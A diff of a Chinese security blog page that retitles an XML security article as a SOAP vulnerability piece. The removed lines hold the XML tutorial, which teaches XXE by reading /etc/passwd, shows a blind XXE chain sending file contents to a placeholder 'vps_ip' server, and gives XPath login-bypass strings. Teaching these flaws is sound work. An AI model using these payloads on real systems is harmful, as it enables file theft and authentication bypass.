@@ -15,7 +15,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>浅析xml及其安全问题 · Sky&#39;s blog</title>
+    <title>SOAP及相关漏洞研究 · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">浅析xml及其安全问题</a>
+                <a href="#" class="post-name">SOAP及相关漏洞研究</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            浅析xml及其安全问题
+            SOAP及相关漏洞研究
             <!-- 404 -->
             
         </h1>
@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">3,784</span> / Reading time: <span class="post-count">15 min</span></span>
+                        <span>Word count: <span class="post-count">1,861</span> / Reading time: <span class="post-count">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/29</span>
+                    <span class="post-intro-time">2018/08/17</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -391,95 +391,22 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <blockquote>
-<p>文章首发在 <a href="https://www.anquanke.com/post/id/155328" target="_blank" rel="noopener">https://www.anquanke.com/post/id/155328</a></p>
+<p>文章首发在 <a href="https://www.anquanke.com/post/id/153065" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065</a></p>
 </blockquote>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文用来归纳并深入理解xml语言及其在web环境中可能存在的安全隐患</p>
-<h2 id="xml基本概念"><a href="#xml基本概念" class="headerlink" title="xml基本概念"></a>xml基本概念</h2><h3 id="什么是xml？"><a href="#什么是xml？" class="headerlink" title="什么是xml？"></a>什么是xml？</h3><p>XML 指可扩展标记语言（EXtensible Markup Language），是一种标记语言，很类似 HTML。其设计宗旨是传输数据，而非显示数据。<br>XML 标签没有被预定义。所以需要自行定义标签。</p>
-<h3 id="什么是标记语言？"><a href="#什么是标记语言？" class="headerlink" title="什么是标记语言？"></a>什么是标记语言？</h3><p>标记语言，是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记进行标识。<br>标记语言不仅仅是一种语言，就像许多语言一样，它需要一个运行时环境，使其有用。提供运行时环境的元素称为用户代理。</p>
-<h3 id="标记语言的不同点"><a href="#标记语言的不同点" class="headerlink" title="标记语言的不同点"></a>标记语言的不同点</h3><p>1.标记语言：</p>
-<ul>
-<li>被读取的，本身没有行为能力（被动）；例如：Html 、XML等<br>2.编程语言：</li>
-<li>需要编译执行；</li>
-<li>本身具有逻辑性和行为能力例如：C、Java等<br>3.脚本语言：</li>
-<li>需要解释执行；</li>
-<li>本身具有逻辑性和行为能力；例如：javascript等</li>
-</ul>
-<h3 id="归纳"><a href="#归纳" class="headerlink" title="归纳"></a>归纳</h3><p>所以说xml本身是一种语言，所以它具有本身语言的特性，和需要完成的功能<br>下面我们看看xml如何发挥自身语言的作用，实现功能</p>
-<h2 id="xml基础语法"><a href="#xml基础语法" class="headerlink" title="xml基础语法"></a>xml基础语法</h2><h3 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h3><p>xml文档是由一组使用唯一名称标识的实体组成的。始终以一个声明开始，这个声明指定该文档遵循XML1.0的规范。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
-<p>encodeing是指使用的字符编码格式有UTF-8,GBK,gb2312等等<br>（这里插一嘴，既然可以设置编码格式，就有可能存在bypass，后续讲）</p>
-<h3 id="根元素"><a href="#根元素" class="headerlink" title="根元素"></a>根元素</h3><p>每个XML文件都必须有且只能有一个根元素。用于描述文档功能。可以自定义根元素。下例中的root为根元素。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>...................<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="XML代码"><a href="#XML代码" class="headerlink" title="XML代码"></a>XML代码</h3><p>根据应用需要创建自定义的元素和属性。标签包括尖括号以及尖括号中的文本。元素是XML内容的基本单元。元素包括了开始标签、结束标签和标签之间的内容。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XML是可扩展标记语言<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="处理指令"><a href="#处理指令" class="headerlink" title="处理指令"></a>处理指令</h3><p>凡是以<code>&lt;?</code>开始，<code>?&gt;</code>结束的都是处理指令。XML声明就是一个处理指令。<br>字符数据分以下两类：<br>PCDATA（是指将要通过解析器进行解析的文本）<br>CDATA （是指不要通过解析器进行解析的文本）<br>其中不允许<code>CDATA</code>块之内使用字符串<code>]]&gt;</code>,因为它表示CDATA块的结束。 </p>
-<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体分为两类： </p>
-<ul>
-<li>一般实体(格式：&amp;实体引用名;) </li>
-<li>参数实体(格式：%实体引用名;)<br>一般实体，可以在XML文档中的任何位置出现的实体称为一般实体。实体可以声明为内部实体还是外部实体。<br>外部实体分SYSYTEM及PUBLIC两种：<br>SYSYTEM引用本地计算机，PUBLIC引用公共计算机，外部实体格式如下： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 引用名 SYSTEM(PUBLIC) &quot;URI地址&quot;&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>DOCTYPE声明<br>在XML文档中，<code>&lt;!DOCTYPE[...]&gt;</code>声明跟在XML声明的后面。实体也必须在DOCTYPE声明中声明。<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> unicode=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="php">&lt;!DOCTYPE[</span></span><br><span class="line"><span class="php">.....在此声明实体&lt;!ENTITY 实体引用名 <span class="string">"引用内容"</span>&gt;</span></span><br><span class="line"><span class="php">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>完整的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"GBK"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY sky1 "引用字符1"&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY sky2 "引用字符2"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">value</span>=<span class="string">"&amp;sky1;"</span>&gt;</span> &amp;sky2; <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>&amp;sky2;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">title2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="xml解析方式"><a href="#xml解析方式" class="headerlink" title="xml解析方式"></a>xml解析方式</h2><p>首先xml是被读取的标记语言，他不可能自我解析，所以需要脚本语言或者编译语言对其进行读取然后解析。<br>这里以Java中主要的两种解析读取方法为例（解析上来说大多大同小异，以java为代表）<br>xml解析的方式分为两种：</p>
-<ul>
-<li>DOM方式</li>
-<li>SAX方式</li>
-</ul>
-<h3 id="DOM方式"><a href="#DOM方式" class="headerlink" title="DOM方式"></a>DOM方式</h3><p>DOM方式即以树型结构访问XML文档：<br> 一棵DOM树包含全部元素节点和文本节点。可以前后遍历树中的每一个节点。<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">DataSource</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">database</span> <span class="attr">name</span>=<span class="string">"mysql"</span> <span class="attr">version</span>=<span class="string">"5.0"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">driver</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">driver</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>jdbc:mysql://localhost:3306/linkinjdbc<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">user</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">	<span class="tag">&lt;<span class="name">database</span> <span class="attr">name</span>=<span class="string">"Oracle"</span> <span class="attr">version</span>=<span class="string">"10G"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">driver</span>&gt;</span>oracle.jdbc.driver.OracleDriver<span class="tag">&lt;/<span class="name">driver</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>jdbc:oracle:thin:@127.0.0.1:linkinOracle<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">user</span>&gt;</span>system<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataSource</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>解析后大概如下<br><img src="/images/2018-08-09-08-40-17.png" alt=""><br>然后再对树操作，进行查找</p>
-<h3 id="SAX方式"><a href="#SAX方式" class="headerlink" title="SAX方式"></a>SAX方式</h3><p>SAX处理的特点是基于事件流的。分析能够立即开始，而不是等待所有的数据被处理。而且，由于应用程序只是在读取数据时检查数据，因此不需要将数据存储在内存中。这对于大型文档来说是个巨大的优点。<br>事实上，应用程序甚至不必解析整个文档；它可以在某个条件得到满足时停止解析。sax分析器在对xml文档进行分析时,触发一系列的事件,应用程序通过事件处理函数实现对xml文档的访问。<br>因为事件触发是有时序性的,所以sax分析器提供的是一种对xml文档的顺序访问机制,对于已经分析过的部分,不能再重新倒回去处理。<br>此外，它也不能同时访问处理2个tag，sax分析器在实现时,只是顺序地检查xml文档中的字节流,判断当前字节是xml语法中的哪一部分,检查是否符合xml语法并且触发相应的事件。对于事件处理函数的本身,要由应用程序自己来实现。<br>SAX解析器采用了基于事件的模型，它在解析XML文档的时候可以触发一系列的事件，当发现给定的tag的时候，它可以激活一个回调方法，告诉该方法制定的标签已经找到。<br>所以对于上述xml内容<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">DataSource</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">database</span> <span class="attr">name</span>=<span class="string">"mysql"</span> <span class="attr">version</span>=<span class="string">"5.0"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">driver</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">driver</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>jdbc:mysql://localhost:3306/linkinjdbc<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">user</span>&gt;</span>root<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">	<span class="tag">&lt;<span class="name">database</span> <span class="attr">name</span>=<span class="string">"Oracle"</span> <span class="attr">version</span>=<span class="string">"10G"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">driver</span>&gt;</span>oracle.jdbc.driver.OracleDriver<span class="tag">&lt;/<span class="name">driver</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>jdbc:oracle:thin:@127.0.0.1:linkinOracle<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">user</span>&gt;</span>system<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">password</span>&gt;</span>root<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">database</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataSource</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>它的解析流程为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">开始解祈XML文档...</span><br><span class="line"></span><br><span class="line">开始解祈元素[DataSource]...</span><br><span class="line">共有[0]个属性...</span><br><span class="line">开始接受元素中的字符串数据...</span><br><span class="line"></span><br><span class="line">开始解祈元素[database]...</span><br><span class="line">共有[2]个属性...</span><br><span class="line">属性名是：name;属性值是:mysql</span><br><span class="line">属性名是：version;属性值是:5</span><br><span class="line">开始接受元素中的字符串数据...</span><br><span class="line"></span><br><span class="line">开始解祈元素[driver]...</span><br><span class="line">共有[0]个属性...</span><br><span class="line">开始接受元素中的字符串数据...</span><br><span class="line">com.mysql.jdbc.Driver</span><br><span class="line">解祈元素[driver]结束...</span><br><span class="line"></span><br><span class="line">开始解祈元素[url]...</span><br><span class="line">共有[0]个属性...</span><br><span class="line">开始接受元素中的字符串数据...</span><br><span class="line">jdbc:mysql://localhost:3306/linkinjdbc</span><br><span class="line">解祈元素[url]结束...</span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line">解祈元素[database]结束...</span><br><span class="line"></span><br><span class="line">开始解祈元素[database]...</span><br><span class="line">共有[2]个属性...</span><br><span class="line">属性名是：name;属性值是:Oracle</span><br><span class="line">属性名是：version;属性值是:10G</span><br><span class="line">开始接受元素中的字符串数据...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line">解祈元素[database]结束...</span><br><span class="line">解祈元素[DataSource]结束...</span><br></pre></td></tr></table></figure></p>
-<p>大概如上，这样即可顺序访问，知道找到需要访问的值，即可回调返回结束</p>
-<h3 id="优缺点对比"><a href="#优缺点对比" class="headerlink" title="优缺点对比"></a>优缺点对比</h3><p>DOM形:</p>
-<ul>
-<li>优点：<ul>
-<li>整个 Dom 树都加载到内存中了，所以允许随机读取访问数</li>
-<li>允许随机的对文档结构进行增删</li>
-</ul>
-</li>
-<li>缺点：<ul>
-<li>整个 XML 文档必须一次性解析完，耗时。</li>
-<li>整个 Dom 树都要加载到内存中，占内存。</li>
-</ul>
-</li>
-<li>适用于：文档较小，且需要修改文档内容<br>SAX形:</li>
-<li>优点：<ul>
-<li>访问能够立即进行，不需要等待所有数据被加载</li>
-<li>不需要将整个数据都加载到内存中，占用内存少</li>
-<li>允许注册多个Handler,可以用来解析文档内容，DTD约束等等</li>
-</ul>
-</li>
-<li>缺点：<ul>
-<li>需要应用程序自己负责TAG的处理逻辑（例如维护父/子关系等），文档越复杂程序就越复杂。</li>
-<li>单向导航，无法定位文档层次，很难同时访问同一文档的不同部分数据，不支持XPath。</li>
-<li>不能随机访问 xml 文档，不支持原地修改xml。</li>
-</ul>
-</li>
-<li>适用于：文档较大，只需要读取文档数据。</li>
-</ul>
-<h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>xml作为数据存储/传递的一种标记语言，一定是会在通讯，交互等时候被使用的，那么编译语言/脚本语言需要读取xml来读取数据的时候，势必会解析xml格式的文本内容<br>那么在解析的时候，如果攻击者可以控制xml格式的文本内容，那么就可以让编译语言/脚本语言接收到恶意构造的参数，若不加过滤，则会引起安全隐患</p>
-<h3 id="XXE-任意文件读取"><a href="#XXE-任意文件读取" class="headerlink" title="XXE-任意文件读取"></a>XXE-任意文件读取</h3><p>在上述的语法中，我们提及到，xml可以引入实体，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 引用名 SYSTEM(PUBLIC) &quot;URI地址&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>我们可以看到，这里填写的是url地址，这就可以涉及到多个问题：<br>1.url协议多样，例如：file、http、gopher……<br>2.是否可以请问外部实体<br>这里我们先做一个简单的测试，使用file协议，引入实体<br>php代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml= file_get_contents(<span class="string">"./xxepayload.txt"</span>);</span><br><span class="line">$data = simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,$options=LIBXML_NOENT);</span><br><span class="line">print_r($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>xml内容如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version = <span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY f SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>访问后可得到回显<br><img src="/images/2018-08-09-09-50-50.png" alt=""><br>这是为什么？<br>因为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">f</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>此处将本地计算机中<code>file:///etc/passwd</code>文件的内容取出，赋值给了实体<code>f</code><br>然后实体<code>f</code>的值作为元素<code>x</code>中的字符串数据被php解析的时候取出，作为对象里的内容<br>然后再输出该对象的时候被打印出来。<br>故此，倘若我们可以控制xml文本内容，那么就能利用编译/脚本语言的解析，输出我们想读的指定文件</p>
-<h3 id="XXE-任意文件盲读取"><a href="#XXE-任意文件盲读取" class="headerlink" title="XXE-任意文件盲读取"></a>XXE-任意文件盲读取</h3><p>我们知道在Xml解析内容可以被输出的时候，我们可以采取上述攻击方式<br>但有时候，xml只作为数据的传递方式，服务端解析xml后，直接将数据进一步处理再输出，甚至不输出，这时候可能就无法得到我们想读的结果。<br>那么此时，可以尝试使用blind xxe进行攻击：<br>1.我们可以利用file协议去读取本地文件<br>2.我们可以利用http协议让实体被带出<br>我们知道xml中，跟的是url地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 引用名 SYSTEM(PUBLIC) &quot;URI地址&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>那么此时我们当然可以使用http协议，那么xml解析的时候势必会去访问我们指定的url链接<br>此时就有可能将数据带出<br>我们想要的方法是这样的<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % param1 "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % param2 "http://vps_ip/?%param1"&gt;</span></span><br><span class="line"><span class="meta">%param2;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>此时xml解析时，就会将我们读取到的内容的param1实体带出，我们再vps的apache log上就可以看到<br>但是上述构造存在语法问题<br>于是我们想到这样一个构造方案<br>post.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://vps_ip/evil.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>evil.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://vps_ip/1.php?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这样一来，在解析xml的时候：<br>1.file实体被赋予<code>file:///etc/passwd</code>的内容<br>2.解析remote值的时候，访问<code>http://vps_ip/evil.xml</code><br>3.在解析<code>evil.xml</code>中all实体的时候，将file实体带入<br>4.访问指定url链接，将数据带出<br>于是成功造成了blind xxe文件读取</p>
-<p>这里再额外提及一下，既然我们再开始申明的时候可以规定编码格式，那么倘若后台对<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENTITY</span><br></pre></td></tr></table></figure></p>
-<p>等关键词进行过滤时，我们可以尝试使用UTF-7，UTF-16等编码去Bypass<br>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-16"</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
-<h3 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h3><p>xml同样可作为数据存储，所以这里可以将其当做数据库<br>类似于如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;users&gt; </span><br><span class="line"></span><br><span class="line">&lt;user&gt; </span><br><span class="line">&lt;firstname&gt;Ben&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;Elmore&lt;/lastname&gt; </span><br><span class="line">&lt;loginID&gt;abc&lt;/loginID&gt; </span><br><span class="line">&lt;password&gt;test123&lt;/password&gt; </span><br><span class="line">&lt;/user&gt; </span><br><span class="line"></span><br><span class="line">&lt;user&gt; </span><br><span class="line">&lt;firstname&gt;Shlomy&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;Gantz&lt;/lastname&gt;</span><br><span class="line">&lt;loginID&gt;xyz&lt;/loginID&gt; </span><br><span class="line">&lt;password&gt;123test&lt;/password&gt; </span><br><span class="line">&lt;/user&gt; </span><br><span class="line"></span><br><span class="line">&lt;user&gt; </span><br><span class="line">&lt;firstname&gt;Jeghis&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;Katz&lt;/lastname&gt;</span><br><span class="line">&lt;loginID&gt;mrj&lt;/loginID&gt; </span><br><span class="line">&lt;password&gt;jk2468&lt;/password&gt; </span><br><span class="line">&lt;/user&gt; </span><br><span class="line"></span><br><span class="line">&lt;user&gt; </span><br><span class="line">&lt;firstname&gt;Darien&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;Heap&lt;/lastname&gt;</span><br><span class="line">&lt;loginID&gt;drano&lt;/loginID&gt; </span><br><span class="line">&lt;password&gt;2mne8s&lt;/password&gt; </span><br><span class="line">&lt;/user&gt; </span><br><span class="line"></span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure></p>
-<p>其查询语句，也类似于sql语句<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/text()=’abc’ and password/text()=’test123’]</span><br></pre></td></tr></table></figure></p>
-<p>所以相同的，我们可以用类似sql注入的方式来闭合引号例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loginID=&apos; or 1=1 or &apos;&apos;=&apos;</span><br><span class="line">password=&apos; or 1=1 or &apos;&apos;=&apos;</span><br></pre></td></tr></table></figure></p>
